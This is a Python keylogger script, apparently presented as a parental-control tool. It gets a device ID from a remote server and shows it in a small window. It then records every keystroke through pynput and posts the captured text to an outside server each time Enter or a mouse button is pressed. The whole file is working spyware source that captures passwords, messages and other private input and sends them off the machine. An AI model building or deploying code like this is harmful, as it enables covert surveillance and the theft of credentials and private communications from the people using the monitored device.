import requests
from pynput import keyboard, mouse
import tkinter as tk

sentence_buffer = []
device_name = None

def show_start_notification():
    global device_name
    try:
        # Get device name from server
        response = requests.get("https://parentcontrolserver.onrender.com/keylogger/get_unique_id")

        if response.status_code == 200:
            data = response.json()
            device_name = data.get("devicename")

            print("Device name from server:", device_name)

            def copy_and_close():
                root.clipboard_clear()
                root.clipboard_append(device_name)
                root.update_idletasks()
                try:
                    root.clipboard_get()
                except tk.TclError as e:
                    print("Clipboard error:", e)
                root.destroy()  # destroy the window after copying

            root = tk.Tk()
            root.title("Device ID Generated")
            root.geometry("300x150")
            root.resizable(False, False)

            label = tk.Label(root, text="Your Device ID:", font=("Arial", 12))
            label.pack(pady=10)

            device_label = tk.Label(root, text=device_name, fg="blue", font=("Arial", 12, "bold"))
            device_label.pack()

            copy_button = tk.Button(root, text="Copy & Close", command=copy_and_close)
            copy_button.pack(pady=15)

            root.mainloop()

        else:
            print("Failed to get device name. Status code:", response.status_code)

    except Exception as e:
        print("Error during startup notification or device fetch:", e)

def send_sentence(sentence):
    global device_name
    try:
        print(device_name, sentence)
        requests.post("https://parentcontrolserver.onrender.com/keylogger/event", json={
            "word": sentence,
            "device": device_name
        })
    except Exception as e:
        print("Error sending sentence:", e)

def on_press(key):
    global sentence_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer.append(key.char)
        elif key == keyboard.Key.space:
            sentence_buffer.append(' ')
        elif key == keyboard.Key.enter:
            if sentence_buffer:
                sentence = ''.join(sentence_buffer).strip()
                send_sentence(sentence)
                sentence_buffer = []
        elif key == keyboard.Key.backspace:
            if sentence_buffer:
                sentence_buffer.pop()
    except Exception as e:
        print("Error in key press:", e)

def on_click(x, y, button, pressed):
    global sentence_buffer
    if pressed and sentence_buffer:
        sentence = ''.join(sentence_buffer).strip()
        send_sentence(sentence)
        sentence_buffer = []

if __name__ == "__main__":
    show_start_notification()
    k_listener = keyboard.Listener(on_press=on_press)
    m_listener = mouse.Listener(on_click=on_click)
    
    k_listener.start()
    m_listener.start()
    
    # This ensures the main thread doesn't exit and keeps both listeners alive
    k_listener.join()
    m_listener.join()
